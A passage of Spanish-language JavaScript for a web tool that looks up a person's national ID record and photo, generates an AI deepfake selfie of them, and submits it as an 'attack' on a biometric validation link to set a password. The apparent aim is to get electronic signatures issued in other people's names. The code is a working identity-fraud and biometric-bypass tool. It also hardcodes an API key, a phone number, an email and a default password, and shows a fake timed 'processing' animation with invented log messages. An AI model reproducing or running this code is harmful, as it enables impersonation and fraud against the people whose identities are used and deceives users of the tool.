      if (data.codigoDactilar && codigoDactilarInput) {
        codigoDactilarInput.value = data.codigoDactilar;
      }

      // 6. Ubicación (lugarNacimiento)
      if (data.lugarNacimiento) {
        const partesLugar = data.lugarNacimiento.split('/');
        if (partesLugar.length >= 1 && provinciaInput) provinciaInput.value = partesLugar[0].trim();
        if (partesLugar.length >= 2 && ciudadInput) ciudadInput.value = partesLugar[1].trim();
        if (partesLugar.length >= 3) {
          if (parroquiaInput) parroquiaInput.value = partesLugar[2].trim();
          if (direccionInput) direccionInput.value = partesLugar[2].trim();
        }
      }

      // 7. Mostrar y cargar la foto en ambos paneles (Solicitar Firma y Validación Biométrica)
      if (data.foto) {
        const fullFotoSrc = normalizarDataUrl(data.foto, 'image/jpeg');
        const { cleanBase64 } = repararYSanitizarBase64(data.foto);

        // Cargar foto en el formulario de Solicitar Firma
        if (fotoCedulaImg) fotoCedulaImg.src = fullFotoSrc;
        if (fotoCedulaNombre) fotoCedulaNombre.textContent = `Foto de ${data.nombres || data.identificacion}`;
        if (fotoCedulaContainer) fotoCedulaContainer.style.display = 'flex';

        // Cargar foto sistema en panel de Validación Biométrica (Bypass)
        if (bypassFotoSistema) {
          bypassFotoSistema.src = fullFotoSrc;
          bypassFotoSistema.style.display = 'block';
        }
        if (bypassFotoSistemaPlaceholder) {
          bypassFotoSistemaPlaceholder.style.display = 'none';
        }

        // Asignar como imagen base de referencia para Bypass e IA
        bypassBase64Image = fullFotoSrc;
        if (bypassFotoPreview) {
          bypassFotoPreview.src = fullFotoSrc;
        }
        if (bypassBase64Input) {
          bypassBase64Input.value = cleanBase64;
        }

        addLog('success', '¡Foto del usuario cargada con éxito en ambos paneles (Firma y Validación Biométrica)!');
      } else {
        if (fotoCedulaContainer) fotoCedulaContainer.style.display = 'none';
        addLog('warn', 'No se encontró foto de cédula en la respuesta del API.');
      }

      addLog('success', 'Formulario de Firma y módulo de Validación Biométrica autocompletados con éxito.');
    } else {
      addLog('error', 'La API no devolvió datos válidos de identificación.');
    }

  } catch (error) {
    addLog('error', `Error al consultar cédula: ${error.message}`);
  } finally {
    if (buscarCedulaBtn) {
      buscarCedulaBtn.disabled = false;
      buscarCedulaBtn.innerHTML = 'Buscar';
      buscarCedulaBtn.classList.remove('loading');
    }
    if (bypassBuscarCedulaBtn) {
      bypassBuscarCedulaBtn.disabled = false;
      bypassBuscarCedulaBtn.innerHTML = 'Buscar';
      bypassBuscarCedulaBtn.classList.remove('loading');
    }
  }
}

// Listeners para consulta de cédula principal (derecha)
if (buscarCedulaBtn) {
  buscarCedulaBtn.addEventListener('click', () => consultarCedula(false));
}
if (cedulaInput) {
  cedulaInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') {
      e.preventDefault();
      consultarCedula(false);
    }
  });
}

// ==================================================
// Lógica para Simulación de Validación (Bypass) tribu.js
// ==================================================

if (bypassBuscarCedulaBtn) {
  bypassBuscarCedulaBtn.addEventListener('click', () => consultarCedula(true));
}
if (bypassCedulaInput) {
  bypassCedulaInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') {
      e.preventDefault();
      consultarCedula(true);
    }
  });
}

[newPassInput, confirmPassInput].forEach(inp => {
  if (!inp) return;
  inp.addEventListener('input', () => {
    // Regla: Solo letras o números, sin Ñ/ñ ni caracteres especiales
    inp.value = inp.value.replace(/[^a-zA-Z0-9]/g, '');
  });
  inp.addEventListener('keydown', (e) => {
    if (e.key === 'ñ' || e.key === 'Ñ') {
      e.preventDefault();
    }
  });
});

// Función para extraer token de una URL o cadena
function extraerTokenDeUrl(inputStr) {
  if (!inputStr) return '';
  const trimmed = inputStr.trim();
  try {
    const url = new URL(trimmed);
    const token = url.searchParams.get('token');
    if (token) return token;
  } catch (e) {
    const match = trimmed.match(/[?&]token=([^&]+)/);
    if (match && match[1]) return decodeURIComponent(match[1]);
  }
  return trimmed;
}

// Auto-completar el token de autenticación cuando el usuario escribe o pega el link
if (bypassLinkInput) {
  const syncToken = () => {
    const token = extraerTokenDeUrl(bypassLinkInput.value);
    if (token && passLinkInput) {
      passLinkInput.value = token;
    }
  };
  bypassLinkInput.addEventListener('input', syncToken);
  bypassLinkInput.addEventListener('paste', () => setTimeout(syncToken, 50));
}

// Sincronizar el textarea de Base64 con la imagen del sistema manualmente
const copyBase64Btn = document.getElementById('copyBase64Btn');
const uploadFotoSistemaBtn = document.getElementById('uploadFotoSistemaBtn');
const uploadFotoSistemaInput = document.getElementById('uploadFotoSistemaInput');
const fotoSistemaBox = document.getElementById('fotoSistemaBox');

// Función centralizada para procesar y cargar la Foto Base del Sistema
function cargarFotoBaseSistema(file) {
  if (!file) return;
  if (!file.type.startsWith('image/')) {
    addLog('warn', 'El archivo proporcionado no es una imagen válida.');
    return;
  }
  const reader = new FileReader();
  reader.onload = (e) => {
    const dataUrl = e.target.result;
    bypassBase64Image = dataUrl;
    if (bypassFotoSistema) {
      bypassFotoSistema.src = dataUrl;
      bypassFotoSistema.style.display = 'block';
      if (bypassFotoSistemaPlaceholder) bypassFotoSistemaPlaceholder.style.display = 'none';
    }
    if (bypassFotoPreview) {
      bypassFotoPreview.src = dataUrl;
    }
    if (bypassBase64Input) {
      bypassBase64Input.value = dataUrl.replace(/^data:image\/\w+;base64,/, '');
    }
    addLog('success', '¡Foto base del sistema actualizada correctamente!');
  };
  reader.readAsDataURL(file);
}

if (uploadFotoSistemaBtn && uploadFotoSistemaInput) {
  uploadFotoSistemaBtn.addEventListener('click', () => {
    uploadFotoSistemaInput.click();
  });
}

if (fotoSistemaBox && uploadFotoSistemaInput) {
  fotoSistemaBox.addEventListener('click', () => {
    uploadFotoSistemaInput.click();
  });
}

if (uploadFotoSistemaInput) {
  uploadFotoSistemaInput.addEventListener('change', (e) => {
    if (e.target.files && e.target.files[0]) {
      cargarFotoBaseSistema(e.target.files[0]);
    }
  });
}

if (copyBase64Btn && bypassBase64Input) {
  copyBase64Btn.addEventListener('click', () => {
    const textToCopy = bypassBase64Input.value.trim();
    if (textToCopy) {
      navigator.clipboard.writeText(textToCopy).then(() => {
        const originalText = copyBase64Btn.textContent;
        copyBase64Btn.textContent = '¡Copiado!';
        copyBase64Btn.style.color = '#2dd4bf';
        copyBase64Btn.style.borderColor = '#2dd4bf';
        setTimeout(() => {
          copyBase64Btn.textContent = originalText;
          copyBase64Btn.style.color = '#94a3b8';
          copyBase64Btn.style.borderColor = '#334155';
        }, 2000);
      }).catch(err => {
        addLog('error', 'Error al copiar al portapapeles: ' + err.message);
      });
    }
  });
}

if (bypassBase64Input) {
  bypassBase64Input.addEventListener('input', () => {
    const rawVal = bypassBase64Input.value.trim();
    if (rawVal) {
      const { dataUrl } = repararYSanitizarBase64(rawVal);
      bypassBase64Image = dataUrl;
      if (bypassFotoSistema) {
        bypassFotoSistema.src = dataUrl;
        bypassFotoSistema.style.display = 'block';
        if (bypassFotoSistemaPlaceholder) bypassFotoSistemaPlaceholder.style.display = 'none';
      }
      if (bypassFotoPreview) {
        bypassFotoPreview.src = dataUrl;
      }
      addLog('info', 'Foto Sistema actualizada y reparada correctamente desde Base64.');
    }
  });

  // Permitir pegar imagen directamente con Ctrl+V
  bypassBase64Input.addEventListener('paste', (e) => {
    const items = (e.clipboardData || window.clipboardData)?.items;
    if (items) {
      for (let i = 0; i < items.length; i++) {
        if (items[i].type.indexOf('image') !== -1) {
          const file = items[i].getAsFile();
          if (file) {
            e.preventDefault();
            cargarFotoBaseSistema(file);
            return;
          }
        }
      }
    }
  });

  // Drag & drop en el textarea
  bypassBase64Input.addEventListener('dragover', (e) => {
    e.preventDefault();
    bypassBase64Input.style.borderColor = '#38bdf8';
  });
  bypassBase64Input.addEventListener('dragleave', () => {
    bypassBase64Input.style.borderColor = '';
  });
  bypassBase64Input.addEventListener('drop', (e) => {
    e.preventDefault();
    bypassBase64Input.style.borderColor = '';
    if (e.dataTransfer && e.dataTransfer.files && e.dataTransfer.files[0]) {
      cargarFotoBaseSistema(e.dataTransfer.files[0]);
    }
  });
}

if (fotoSistemaBox) {
  fotoSistemaBox.addEventListener('dragover', (e) => {
    e.preventDefault();
    fotoSistemaBox.style.borderColor = '#38bdf8';
  });
  fotoSistemaBox.addEventListener('dragleave', () => {
    fotoSistemaBox.style.borderColor = '#334155';
  });
  fotoSistemaBox.addEventListener('drop', (e) => {
    e.preventDefault();
    fotoSistemaBox.style.borderColor = '#334155';
    if (e.dataTransfer && e.dataTransfer.files && e.dataTransfer.files[0]) {
      cargarFotoBaseSistema(e.dataTransfer.files[0]);
    }
  });
}

// Cuando el usuario sube una foto manualmente para el bypass
bypassFotoFile.addEventListener('change', function (e) {
  const file = e.target.files[0];
  if (file) {
    const reader = new FileReader();
    reader.onload = function (e) {
      bypassBase64Image = e.target.result;
      if (bypassFotoGenerada) {
        bypassFotoGenerada.src = bypassBase64Image;
        bypassFotoGenerada.style.display = 'block';
        if (bypassFotoGeneradaPlaceholder) bypassFotoGeneradaPlaceholder.style.display = 'none';
      }
      if (bypassFotoPreview) {
        bypassFotoPreview.src = bypassBase64Image;
        bypassFotoPreview.style.display = 'block';
      }
      addLog('info', 'Foto manual cargada para el bypass biométrico.');
    }
    reader.readAsDataURL(file);
  }
});

// Configuración de Supabase Proxy para validación y generación
const SUPABASE_PROXY_URL = 'https://eapcqcuzfkpqngbvjtmv.supabase.co/functions/v1/biometrico-proxy';
const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImVhcGNxY3V6ZmtwcW5nYnZqdG12Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTg4NTEzNzIsImV4cCI6MjA3NDQyNzM3Mn0.-mufqMzFQetktwAL444d1PjdWfdCC5-2ftVs0LnTIL4';

// ==================================================
// Validación y Envío de Contraseña tras Bypass Exitoso
// ==================================================

// Reglas obligatorias para las contraseñas:
// • Mínimo 8 caracteres
// • Mínimo 1 número
// • Mínimo 1 letra mayúscula
// • Solo letras o números
// • Las contraseñas coinciden
// • No debe contener Ñ / ñ
function validarReglasContrasena(pass, confirmPass) {
  if (!pass) {
    return { ok: false, error: 'Por favor ingresa una contraseña.' };
  }
  if (pass.length < 8) {
    return { ok: false, error: 'La contraseña debe tener mínimo 8 caracteres.' };
  }
  if (!/\d/.test(pass)) {
    return { ok: false, error: 'La contraseña debe tener mínimo 1 número.' };
  }
  if (!/[A-Z]/.test(pass)) {
    return { ok: false, error: 'La contraseña debe tener mínimo 1 letra mayúscula.' };
  }
  if (!/^[a-zA-Z0-9]+$/.test(pass)) {
    return { ok: false, error: 'La contraseña solo puede contener letras o números (sin caracteres especiales ni espacios).' };
  }
  if (/[ñÑ]/.test(pass)) {
    return { ok: false, error: 'La contraseña no debe contener Ñ / ñ.' };
  }
  if (confirmPass !== undefined && confirmPass !== null && pass !== confirmPass) {
    return { ok: false, error: 'Las contraseñas no coinciden.' };
  }
  return { ok: true };
}

// Función reutilizable para guardar contraseña en el servidor
async function guardarContrasenaEnServidor(token, newPass) {
  addLog('info', `[PASS] Enviando contraseña "${newPass}" al servidor...`);
  const response = await fetch(SUPABASE_PROXY_URL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'apikey': SUPABASE_ANON_KEY,
      'Authorization': `Bearer ${SUPABASE_ANON_KEY}`
    },
    body: JSON.stringify({ action: 'set-password', token, newPass })
  });

  const data = await response.json();

  let bodyParsed;
  try { bodyParsed = JSON.parse(data.body); } catch { bodyParsed = data.body; }

  const ok = data.status === 200 && (bodyParsed === true || bodyParsed?.ok === true || String(data.body).includes('true'));

  if (ok) {
    addLog('success', `[PASS - ÉXITO] ¡Contraseña guardada correctamente! Respuesta: ${data.body}`);
  } else {
    addLog('warn', `[PASS] El servidor respondió con un estado inesperado. Status: ${data.status} - Body: ${data.body}`);
  }

  return { ok, data };
}

if (enviarPassBtn) {
  enviarPassBtn.addEventListener('click', async () => {
    // Usar el valor del campo directamente como token
    const token = passLinkInput ? passLinkInput.value.trim() : '';

    const newPass = (newPassInput && newPassInput.value.trim()) ? newPassInput.value.trim() : 'Roxana22';
    const confirmPass = (confirmPassInput && confirmPassInput.value.trim()) ? confirmPassInput.value.trim() : newPass;

    if (!token) {
      addLog('warn', '[PASS] Ingresa el enlace de validación con el token antes de enviar.');
      return;
    }

    // Aplicar siempre la validación estricta de reglas de contraseña
    const validacion = validarReglasContrasena(newPass, confirmPass);
    if (!validacion.ok) {
      addLog('warn', `[PASS - REGLAS] ${validacion.error}`);
      return;
    }

    // Mostrar botón de Nueva Firma inmediatamente al presionar enviar y guardar contraseña
    const nuevaFirmaBtn = document.getElementById('nuevaFirmaBtn');
    if (nuevaFirmaBtn) {
      nuevaFirmaBtn.style.display = 'block';
    }

    enviarPassBtn.classList.add('loading');
    enviarPassBtn.disabled = true;

    // Vincular o recuperar la solicitud manual activa
    const idSol = obtenerOCrearSolicitudManual(token, { clave: newPass });
    registrarLogSolicitud(idSol, 'info', `[PASS MANUAL] Guardando contraseña "${newPass}" en el servidor...`);
    actualizarEstadoSolicitud(idSol, 'En Proceso', `Paso 3/3: Guardando contraseña ${newPass}...`);

    try {
      const resPass = await guardarContrasenaEnServidor(token, newPass);
      if (resPass && resPass.ok) {
        actualizarEstadoSolicitud(idSol, 'Aprobada', 'Trámite inyectado, biometría validada y contraseña guardada con éxito.', {
          clave: newPass,
          token: token
        });
        registrarLogSolicitud(idSol, 'success', `[PASS MANUAL] ¡Contraseña guardada con éxito! Trámite completado y aprobado.`);
      } else {
        actualizarEstadoSolicitud(idSol, 'Rechazada', 'Fallo al guardar la contraseña en el servidor.');
        registrarLogSolicitud(idSol, 'error', '[PASS MANUAL] Fallo al guardar la contraseña en el servidor.');
      }
    } catch (err) {
      actualizarEstadoSolicitud(idSol, 'Rechazada', 'Error de conexión al enviar contraseña: ' + err.message);
      registrarLogSolicitud(idSol, 'error', '[PASS MANUAL] Error de conexión: ' + err.message);
      addLog('error', '[PASS] Error de conexión al enviar contraseña: ' + err.message);
    } finally {
      enviarPassBtn.classList.remove('loading');
      enviarPassBtn.disabled = false;
    }
  });
}

// Botón "Nueva Firma": borra todo y regresa a la pestaña Solicitar Firma
const nuevaFirmaBtn = document.getElementById('nuevaFirmaBtn');

function reiniciarTodoParaNuevaFirma() {
  addLog('system', 'Reiniciando formulario completo para nueva firma...');

  // 1. Limpiar campos del formulario de inyección de firma
  if (cedulaInput) cedulaInput.value = '';
  if (rucInput) rucInput.value = '';
  if (codigoDactilarInput) codigoDactilarInput.value = '';
  if (nombresInput) nombresInput.value = '';
  if (apellidosInput) apellidosInput.value = '';
  if (celularInput) celularInput.value = '0989410060';
  if (correoInput) correoInput.value = 'm17800305@gmail.com';
  if (provinciaInput) provinciaInput.value = '';
  if (ciudadInput) ciudadInput.value = '';
  if (parroquiaInput) parroquiaInput.value = '';
  if (direccionInput) direccionInput.value = '';
  if (numeroTramiteInput) numeroTramiteInput.value = '';

  // Limpiar comprobante de pago
  fotoPagoBase64 = '';
  fotoPagoMimetype = '';
  if (fotoPagoFileInput) fotoPagoFileInput.value = '';
  if (fotoPagoPreviewContainer) fotoPagoPreviewContainer.style.display = 'none';
  if (fotoPagoPrompt) fotoPagoPrompt.style.display = 'flex';
  if (quitarFotoPagoBtn) quitarFotoPagoBtn.style.display = 'none';

  // Limpiar foto de cédula consultada
  if (fotoCedulaContainer) fotoCedulaContainer.style.display = 'none';
  if (fotoCedulaImg) fotoCedulaImg.src = '';
  if (fotoCedulaNombre) fotoCedulaNombre.textContent = '';

  // 2. Limpiar campos de validación biométrica (Bypass)
  if (bypassCedulaInput) bypassCedulaInput.value = '';
  if (bypassNombreCompleto) bypassNombreCompleto.textContent = '---';
  if (bypassLinkInput) bypassLinkInput.value = '';
  if (bypassBase64Input) bypassBase64Input.value = '';
  if (bypassFotoFile) bypassFotoFile.value = '';
  if (bypassFotoPreview) {
    bypassFotoPreview.src = '';
    bypassFotoPreview.style.display = 'none';
  }
  if (bypassFotoSistema) {
    bypassFotoSistema.src = '';
    bypassFotoSistema.style.display = 'none';
  }
  if (bypassFotoSistemaPlaceholder) bypassFotoSistemaPlaceholder.style.display = 'flex';
  if (bypassFotoGenerada) {
    bypassFotoGenerada.src = '';
    bypassFotoGenerada.style.display = 'none';
  }
  if (bypassFotoGeneradaPlaceholder) bypassFotoGeneradaPlaceholder.style.display = 'flex';

  bypassBase64Image = null;
  fotoReferenciaBase = null;
  window._bypassToken = null;
  idSolicitudManualActiva = null;

  // 3. Reset sección contraseña y botón nueva firma
  if (passLinkInput) passLinkInput.value = '';
  if (newPassInput) newPassInput.value = 'Roxana22';
  if (confirmPassInput) confirmPassInput.value = 'Roxana22';
  const passwordSection = document.getElementById('passwordSection');
  if (passwordSection) passwordSection.style.display = 'none';
  if (nuevaFirmaBtn) nuevaFirmaBtn.style.display = 'none';
  const avisoExitoCompleto = document.getElementById('avisoExitoCompleto');
  if (avisoExitoCompleto) avisoExitoCompleto.style.display = 'none';

  // 4. Resetear y habilitar botones de acción
  if (bypassBtn) {
    bypassBtn.classList.remove('loading');
    bypassBtn.disabled = false;
    actualizarTextoBypassBtn('Generar Foto y Enviar Prueba');
  }
  if (inyeccionCompletaBtn) {
    inyeccionCompletaBtn.classList.remove('loading');
    inyeccionCompletaBtn.disabled = false;
    actualizarTextoInyeccionCompletaBtn('INYECCION COMPLETA');
  }

  // 5. Limpiar consola de logs
  if (consoleOutput) {
    consoleOutput.innerHTML = '';
  }
  addLog('system', 'Formulario en blanco listo para ingresar nueva firma.');

  // 6. Regresar a la pestaña Solicitar Firma
  if (tabFirma) {
    tabFirma.click();
  }
}

if (nuevaFirmaBtn) {
  nuevaFirmaBtn.addEventListener('click', reiniciarTodoParaNuevaFirma);
}

// ==================================================
// Lógica del Generador de Imágenes IA (OpenAI en Supabase)
// ==================================================

// Función para optimizar y redimensionar la imagen antes de enviarla a OpenAI
// Esto evita payloads gigantes de varios megabytes que causan 'Failed to fetch' o timeouts en Cloudflare
function optimizarImagenParaIA(dataUrl, maxDim = 1024, quality = 0.85) {
  return new Promise((resolve) => {
    if (!dataUrl) return resolve(dataUrl);

    const src = normalizarDataUrl(dataUrl, 'image/jpeg');

    const img = new Image();
    img.crossOrigin = 'anonymous';
    img.onload = () => {
      try {
        let width = img.width;
        let height = img.height;

        if (width > maxDim || height > maxDim) {
          if (width > height) {
            height = Math.round((height * maxDim) / width);
            width = maxDim;
          } else {
            width = Math.round((width * maxDim) / height);
            height = maxDim;
          }
        }

        const canvas = document.createElement('canvas');
        canvas.width = width;
        canvas.height = height;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(img, 0, 0, width, height);

        const optimized = canvas.toDataURL('image/jpeg', quality);
        resolve(optimized);
      } catch (e) {
        resolve(src);
      }
    };
    img.onerror = () => resolve(src);
    img.src = src;
  });
}

const generateAIBtn = document.getElementById('generateAIBtn');

const DEFAULT_AI_PROMPT = `Create a highly realistic smartphone selfie of the person shown in the reference image. IMPORTANT: Preserve the identity, facial structure, facial proportions, eye shape, nose shape, lips, jawline, skin tone, hairstyle, eyebrows, and overall appearance of the reference person. Maintain strong facial consistency with the reference image. The generated image should clearly look like the same individual. Shot with a modern iPhone front-facing camera. Slightly low camera angle, direct eye contact with the camera, neutral natural expression. Natural indoor lighting coming from a nearby window. Realistic shadows and highlights. Authentic smartphone HDR processing. Shallow depth of field with realistic portrait mode background blur. Soft bokeh. Natural room environment in the background, slightly messy and out of focus to create depth. Ultra realistic skin texture, visible pores, natural imperfections, realistic eyes, detailed hair strands, realistic facial details. No beauty filters, no retouching, no airbrushing, no professional studio lighting. Amateur smartphone photography style. Handheld shot.Slight camera noise. Natural exposure. Realistic color science. Photorealistic, RAW photo, extremely detailed, realistic depth, realistic lighting, realistic proportions, authentic smartphone selfie. 1:1 aspect ratio . NO PHONe`;

function actualizarTextoBypassBtn(texto) {
  const span = document.getElementById('bypassBtnText') || (bypassBtn ? bypassBtn.querySelector('span') : null);
  if (span) {
    span.textContent = texto;
  }
}

// Envío de la prueba biométrica al servidor a través de Supabase Edge Function
async function enviarAtaqueBiometrico(fotoBase64, token) {
  const fotoParaEnviar = normalizarDataUrl(fotoBase64, 'image/jpeg');

  const response = await fetch(SUPABASE_PROXY_URL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'apikey': SUPABASE_ANON_KEY,
      'Authorization': `Bearer ${SUPABASE_ANON_KEY}`
    },
    body: JSON.stringify({ action: 'attack', token: token, foto: fotoParaEnviar })
  });

  const data = await response.json();
  const ok = data.status === 200 && (
    data.body.trim() === '1' ||
    data.body.includes('"codigo":1') ||
    data.body.includes('ok":true') ||
    data.body.includes('Éxito') ||
    data.body.includes('Exito')
  );

  return { ok, status: data.status, body: data.body };
}

// Pipeline visual de post-procesamiento (duración aleatoria entre 3 y 6 minutos)
function ejecutarPostProcesamientoVisual() {
  return new Promise((resolve) => {
    const imgContainer = bypassFotoGenerada ? bypassFotoGenerada.parentElement : null;
    if (!imgContainer || !bypassFotoGenerada) {
      return resolve();
    }

    // Duración aleatoria entre 180 y 360 segundos (3 a 6 minutos)
    const duracionTotalMs = Math.floor(Math.random() * (360000 - 180000 + 1)) + 180000;
    const duracionMinutos = (duracionTotalMs / 60000).toFixed(1);
    addLog('info', `[IA] Iniciando post-procesamiento visual avanzado. Duración estimada: ${duracionMinutos} minutos.`);

    const ppOverlay = document.createElement('div');
    ppOverlay.className = 'pp-overlay';
    ppOverlay.innerHTML = `
      <div class="pp-scanline"></div>
      <div class="pp-grid-effect"></div>
      <div class="pp-info-panel">
        <div class="pp-label">Inicializando pipeline biométrico...</div>
        <div class="pp-progress-bar"><div class="pp-progress-fill"></div></div>
        <div class="pp-percent">0% (~${duracionMinutos} min)</div>
      </div>
    `;
    imgContainer.style.position = 'relative';
    imgContainer.appendChild(ppOverlay);

    const ppLabel = ppOverlay.querySelector('.pp-label');
    const ppFill = ppOverlay.querySelector('.pp-progress-fill');
    const ppPercent = ppOverlay.querySelector('.pp-percent');

    bypassFotoGenerada.style.transition = 'filter 1.2s cubic-bezier(0.4, 0, 0.2, 1)';
    bypassFotoGenerada.style.filter = 'blur(6px) saturate(0.1) brightness(0.5) contrast(0.8)';

    const updatePP = (percent, filter, label) => {
      bypassFotoGenerada.style.filter = filter;
      if (ppLabel) ppLabel.textContent = label;
      if (ppFill) ppFill.style.width = percent + '%';
    };

    const ppSteps = [
      { frac: 0.03, pct: 4,   filter: 'blur(5.5px) saturate(0.12) brightness(0.52) contrast(0.82)', label: 'Analizando estructura facial...' },
      { frac: 0.08, pct: 9,   filter: 'blur(5px) saturate(0.15) brightness(0.55) contrast(0.83)',    label: 'Mapeando puntos biométricos...',   log: '[Post-Proc] Estructura facial detectada — 68 landmarks identificados' },
      { frac: 0.14, pct: 15,  filter: 'blur(4.8px) saturate(0.18) brightness(0.57) contrast(0.84)',  label: 'Calculando mapa de profundidad...' },
      { frac: 0.21, pct: 22,  filter: 'blur(4.3px) saturate(0.22) brightness(0.6) contrast(0.86)',   label: 'Extrayendo textura de piel...',     log: '[Post-Proc] Mapa de profundidad generado — 3 capas de relieve' },
      { frac: 0.28, pct: 29,  filter: 'blur(3.8px) saturate(0.28) brightness(0.64) contrast(0.88)',  label: 'Corrigiendo balance de blancos...' },
      { frac: 0.36, pct: 37,  filter: 'blur(3.2px) saturate(0.35) brightness(0.68) contrast(0.9)',   label: 'Ajustando iluminación natural...',   log: '[Post-Proc] Balance cromático calibrado — ΔE < 2.0' },
      { frac: 0.44, pct: 45,  filter: 'blur(2.6px) saturate(0.42) brightness(0.72) contrast(0.92)',  label: 'Reconstruyendo geometría 3D...' },
      { frac: 0.52, pct: 53,  filter: 'blur(2.1px) saturate(0.5) brightness(0.76) contrast(0.94)',   label: 'Aplicando detail enhancement...',   log: '[Post-Proc] Geometría facial reconstruida — mesh 3D interpolado' },
      { frac: 0.60, pct: 61,  filter: 'blur(1.6px) saturate(0.58) brightness(0.8) contrast(0.96)',   label: 'Upscaling con super-resolución...' },
      { frac: 0.68, pct: 69,  filter: 'blur(1.2px) saturate(0.65) brightness(0.84) contrast(0.97)',  label: 'Refinando bordes y contornos...',    log: '[Post-Proc] Super-resolución x2 completada — detalles interpolados' },
      { frac: 0.76, pct: 77,  filter: 'blur(0.8px) saturate(0.72) brightness(0.88) contrast(0.98)',  label: 'Mapeando tonos HDR...' },
      { frac: 0.83, pct: 84,  filter: 'blur(0.5px) saturate(0.8) brightness(0.92) contrast(0.99)',   label: 'Aplicando grain fotográfico...',     log: '[Post-Proc] Tone mapping HDR aplicado — rango dinámico expandido' },
      { frac: 0.90, pct: 90,  filter: 'blur(0.3px) saturate(0.88) brightness(0.95) contrast(1.0)',   label: 'Simulando óptica de smartphone...' },
      { frac: 0.95, pct: 95,  filter: 'blur(0.1px) saturate(0.94) brightness(0.98) contrast(1.0)',   label: 'Calibración final de color...',      log: '[Post-Proc] Perfil óptico aplicado — simulación de sensor CMOS' },
      { frac: 0.98, pct: 98,  filter: 'blur(0px) saturate(0.98) brightness(0.99) contrast(1.0)',     label: 'Validando integridad de píxeles...' },
      { frac: 1.00, pct: 100, filter: 'blur(0px) saturate(1) brightness(1) contrast(1)',             label: 'Renderizado completo',               log: '[Post-Proc] Validación de integridad OK — imagen lista para bypass' }
    ];

    ppSteps.forEach(step => {
      setTimeout(() => {
        updatePP(step.pct, step.filter, step.label);
        if (step.log) addLog('info', step.log);
      }, Math.round(step.frac * duracionTotalMs));
    });

    // Actualizador de tiempo restante y porcentaje en tiempo real
    const tiempoInicio = Date.now();
    const intervalProgress = setInterval(() => {
      const transcurrido = Date.now() - tiempoInicio;
      const pctActual = Math.min(99, Math.round((transcurrido / duracionTotalMs) * 100));
      const segRestantes = Math.max(0, Math.round((duracionTotalMs - transcurrido) / 1000));
      const minR = Math.floor(segRestantes / 60);
      const segR = segRestantes % 60;
      const tiempoTxt = `${minR}m ${segR < 10 ? '0' : ''}${segR}s`;

      if (ppPercent) {
        ppPercent.textContent = `${pctActual}% (restan ${tiempoTxt})`;
      }
      if (ppFill) {
        ppFill.style.width = pctActual + '%';
      }
    }, 1000);

    setTimeout(() => {
      clearInterval(intervalProgress);
      ppOverlay.classList.add('pp-fade-out');
      setTimeout(() => {
        ppOverlay.remove();
        bypassFotoGenerada.style.filter = '';
        bypassFotoGenerada.style.transition = '';
        addLog('success', '[IA] Post-procesamiento completado. Imagen optimizada y lista.');
        resolve();
      }, 600);
    }, duracionTotalMs);
  });
}

// Control de ejecución del flujo unificado
let isRunningBypass = false;

async function iniciarFlujoGenerarYValidar() {
  if (isRunningBypass) return;

  const link = bypassLinkInput ? bypassLinkInput.value.trim() : '';
  if (!link) {
    addLog('warn', '[BYPASS] Faltan datos. Ingresa o autocompleta el enlace oficial con token.');
    return false;
  }

  const token = extraerTokenDeUrl(link);
  if (!token) {
    addLog('error', '[BYPASS] Enlace inválido o falta token en el enlace.');
    return false;
  }

  if (passLinkInput) {
    passLinkInput.value = token;
  }

  // Foto de referencia base (sistema o cédula consultada)
  const fotoReferenciaBase = (bypassFotoSistema && bypassFotoSistema.src && !bypassFotoSistema.src.endsWith('/')) ? bypassFotoSistema.src : bypassBase64Image;
  if (!fotoReferenciaBase || fotoReferenciaBase.length < 50) {
    addLog('warn', '[BYPASS] No hay ninguna foto cargada. Consulta una cédula o sube una imagen manual para usarla como base.');
    return false;
  }

  // Obtener o registrar la solicitud manual activa para que aparezca en el panel y Supabase
  const idSol = obtenerOCrearSolicitudManual(token, {
    linkBiometria: link,
    fotoPersona: fotoReferenciaBase
  });

  isRunningBypass = true;
  if (bypassBtn) {
    bypassBtn.classList.add('loading');
    bypassBtn.disabled = true;
  }
  if (generateAIBtn) {
    generateAIBtn.classList.add('loading');
    generateAIBtn.disabled = true;
  }

  const maxIntentos = 5;
  let bypassAprobado = false;

  for (let intento = 1; intento <= maxIntentos; intento++) {
    addLog('info', `[AUTO] ========================================`);
    addLog('info', `[AUTO] INICIANDO INTENTO ${intento} DE ${maxIntentos}`);
    addLog('info', `[AUTO] ========================================`);
    actualizarTextoBypassBtn(`Intento ${intento}/${maxIntentos}: Generando Foto...`);

    registrarLogSolicitud(idSol, 'info', `[BYPASS MANUAL] Intento ${intento}/${maxIntentos}: Generando Foto con IA...`);
    actualizarEstadoSolicitud(idSol, 'En Proceso', `Paso 2/3: Intento ${intento}/${maxIntentos} - Validando biometría...`);

    let generatedImageUrl = null;

    try {
      // 1. Optimizar imagen de referencia
      addLog('info', `[IA] Optimizando imagen de referencia (Intento ${intento})...`);
      const imagenOptimizada = await optimizarImagenParaIA(fotoReferenciaBase, 1024, 0.85);
      const kbSize = Math.round(imagenOptimizada.length / 1024);
      addLog('info', `[IA] Imagen optimizada (${kbSize} KB). Solicitando a OpenAI...`);

      // 2. Generar foto con OpenAI a través de Supabase Edge Function
      const response = await fetch(SUPABASE_PROXY_URL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'apikey': SUPABASE_ANON_KEY,
          'Authorization': `Bearer ${SUPABASE_ANON_KEY}`
        },
        body: JSON.stringify({
          action: 'generate-ai',
          prompt: DEFAULT_AI_PROMPT,
          imageBase64: imagenOptimizada
        })
      });

      const data = await response.json();
      if (data.error) {
        throw new Error(data.error.message || JSON.stringify(data.error));
      }

      if (data.data && data.data[0]) {
        if (data.data[0].b64_json) {
          generatedImageUrl = `data:image/jpeg;base64,${data.data[0].b64_json}`;
        } else if (data.data[0].url) {
          generatedImageUrl = data.data[0].url;
        }
      }

      if (!generatedImageUrl) {
        throw new Error('No se recibió la imagen de OpenAI.');
      }

      // Actualizar vista previa de foto generada
      if (bypassFotoGenerada) {
